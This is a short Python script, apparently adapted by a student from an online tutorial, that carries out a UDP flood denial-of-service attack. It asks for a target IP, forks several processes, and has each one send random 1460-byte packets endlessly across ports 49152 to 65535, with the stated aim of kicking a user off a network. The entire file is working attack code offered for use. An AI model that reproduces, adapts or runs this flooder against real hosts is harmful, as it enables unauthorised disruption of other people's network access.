# Author: Stuart Woodbury
# email: yr45570@umbc.edu
# source: http://null-byte.wonderhowto.com/how-to/udp-flooding-kick-local-user-off-network-0132581/
# this is not my own work. i modified a program posted on this site. the article was written by alex long
# causes memory leaks


import socket #Imports needed libraries
import random
import os

def attack(ip):
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a  IP UDP socket
	bytes=random._urandom(1460) #Creates packet
	#port=input('Port: ') #Port we direct to attack

	port = 49152 #attack ephemeral ports

	while 1: #Infinitely loops sending packets to the port until the program is exited.
		while port < 65535:
			sock.sendto(bytes,(ip,port))
			port = port + 1
		port = 49152


def child(ip):
	attack(ip)

def parent():

	counter = 0
	ip=raw_input('Target IP: ') #The IP we are attacking
	while counter < 3: 
		pid = os.fork()
		if(pid == 0):
			child(ip)
		else:
			attack(ip)
		counter = counter + 1

parent()
